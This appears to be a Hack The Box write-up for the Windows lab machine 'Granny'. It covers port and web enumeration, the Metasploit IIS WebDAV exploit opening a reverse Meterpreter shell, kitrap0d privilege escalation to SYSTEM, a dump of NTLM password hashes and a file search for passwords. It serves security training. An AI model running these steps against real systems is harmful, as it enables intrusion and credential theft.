# Granny 10.10.10.15 - Windows

 - __User__:
 - __Root__:

## Initial Attempt, 05/08/2020

### Enumeration

`nmap -oA granny -A -p- 10.10.10.15`

```powershell
Nmap scan report for 10.10.10.15
Host is up (0.029s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods:
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan:
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|_  Server Date: Fri, 08 May 2020 21:20:18 GMT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```powershell
[+] Url:            http://10.10.10.15
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
/_private (Status: 301)
/_vti_log (Status: 301)
/_vti_bin (Status: 301)
/_vti_bin/_vti_aut/author.dll (Status: 200)
/_vti_bin/_vti_adm/admin.dll (Status: 200)
/_vti_bin/shtml.dll (Status: 200)
/aspnet_client (Status: 301)
/Images (Status: 301)
/images (Status: 301)
```

`nikto -host 10.10.10.15 -output nikto.txt`

```powershell
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-397: HTTP method 'PUT' allows clients to save files on the web server.
+ OSVDB-5646: HTTP method 'DELETE' allows clients to delete files on the web server.
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (MKCOL PROPFIND LOCK SEARCH PROPPATCH UNLOCK COPY listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the servers internal IP address: http://granny/_vti_bin/_vti_aut/author.dll
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_private/: FrontPage directory found.
+ OSVDB-3233: /_vti_bin/: FrontPage directory found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3300: /_vti_bin/: shtml.exe/shtml.dll is available remotely. Some versions of the Front Page ISAPI filter are vulnerable to a DOS (not attempted).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 8018 requests: 0 error(s) and 32 item(s) reported on remote host
```

Looks very similar to Grandpa so far. Let's try the same approach, see if we get a quick route in:

```powershell
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > setg RHOSTS 10.10.10.15
RHOSTS => 10.10.10.15
msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run

[*] Started reverse TCP handler on 10.10.14.53:4444
[*] Trying path length 3 to 60 ...
[*] Sending stage (176195 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.53:4444 -> 10.10.10.15:1030) at 2020-05-08 17:39:38 -0400

meterpreter > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 2028 created.
Channel 2 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```

Same thing. I suppose we have to simply migrate and execute `kitrap0d` ?

```powershell
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 324   272   csrss.exe
 348   272   winlogon.exe
 396   348   services.exe
 408   348   lsass.exe
 596   396   svchost.exe
 604   1084  cidaemon.exe
 680   396   svchost.exe
 736   396   svchost.exe
 764   396   svchost.exe
 800   396   svchost.exe
 824   1084  cidaemon.exe
 936   396   spoolsv.exe
 964   396   msdtc.exe
 1012  1084  cidaemon.exe
 1084  396   cisvc.exe
 1132  396   svchost.exe
 1180  396   inetinfo.exe
 1216  396   svchost.exe
 1332  396   VGAuthService.exe
 1416  396   vmtoolsd.exe
 1464  396   svchost.exe
 1604  396   svchost.exe
 1716  396   alg.exe
 1852  596   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1924  396   dllhost.exe
 2324  596   wmiprvse.exe
 2516  348   logon.scr
 2756  1464  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2828  596   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3352  2756  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3600  1464  w3wp.exe

meterpreter > migrate 2828
[*] Migrating from 3352 to 2828...
[*] Migration completed successfully.
```

So far so good, `kitrap0d` fails on the first run but we just need to fix `LHOST` to listen to our HTB VPN on `tun0` instead of the local network interface. And we get the same escalation we saw on `Grandpa`:

```powershell
msf5 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.53:4444
[*] Launching notepad to host the exploit...
[+] Process 2880 launched.
[*] Reflectively injecting the exploit DLL into 2880...
[*] Injecting exploit into 2880 ...
[*] Exploit injected. Injecting payload into 2880...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.53:4444 -> 10.10.10.15:1032) at 2020-05-08 17:44:10 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

This was basically a repeat of Grandpa if you go the metasploit route.

## Loot

#### Flags

 - User @ `C:\Documents and Settings\Lakis\Desktop\user.txt`

 - Root @ `C:\Documents and Settings\Administrator\Desktop\root.txt`

#### Dumps

```powershell
meterpreter > hashdump
Administrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::
ASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::
IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::
Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::
SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::
```

```powershell
C:\>findstr /SI /M "password" *.xml *.ini *.txt

Program Files\Common Files\Microsoft Shared\web server extensions\50\bin\cfgquiet.ini
Program Files\VMware\VMware Tools\open_source_licenses.txt
WINDOWS\msdfmap.ini
WINDOWS\setuplog.txt
WINDOWS\system32\corebins\I386\SCHEMA.INI
WINDOWS\system32\icsxml\ipcfg.xml
WINDOWS\system32\icsxml\pppcfg.xml
WINDOWS\system32\inetsrv\History\MBSchema_0000000023_0000000000.xml
WINDOWS\system32\inetsrv\History\MBSchema_0000000024_0000000000.xml
WINDOWS\system32\inetsrv\History\MBSchema_0000000025_0000000000.xml
WINDOWS\system32\inetsrv\History\MBSchema_0000000026_0000000000.xml
WINDOWS\system32\inetsrv\History\MBSchema_0000000027_0000000000.xml
WINDOWS\system32\inetsrv\History\MBSchema_0000000028_0000000000.xml
WINDOWS\system32\inetsrv\History\MBSchema_0000000029_0000000000.xml
WINDOWS\system32\inetsrv\History\MBSchema_0000000030_0000000000.xml
WINDOWS\system32\inetsrv\History\MBSchema_0000000031_0000000000.xml
WINDOWS\system32\inetsrv\History\MBSchema_0000000032_0000000000.xml
WINDOWS\system32\inetsrv\History\MetaBase_0000000023_0000000000.xml
WINDOWS\system32\inetsrv\History\MetaBase_0000000024_0000000000.xml
WINDOWS\system32\inetsrv\History\MetaBase_0000000025_0000000000.xml
WINDOWS\system32\inetsrv\History\MetaBase_0000000026_0000000000.xml
WINDOWS\system32\inetsrv\History\MetaBase_0000000027_0000000000.xml
WINDOWS\system32\inetsrv\History\MetaBase_0000000028_0000000000.xml
WINDOWS\system32\inetsrv\History\MetaBase_0000000029_0000000000.xml
WINDOWS\system32\inetsrv\History\MetaBase_0000000030_0000000000.xml
WINDOWS\system32\inetsrv\History\MetaBase_0000000031_0000000000.xml
WINDOWS\system32\inetsrv\History\MetaBase_0000000032_0000000000.xml
WINDOWS\system32\inetsrv\MBSchema.xml
WINDOWS\system32\inetsrv\MetaBase.xml
WINDOWS\system32\MicrosoftPassport\partner2.xml
WINDOWS\system32\msppptnr.xml
WINDOWS\system32\ntdsctrs.ini
WINDOWS\system32\schema.ini
WINDOWS\system32\sfmuam.txt
```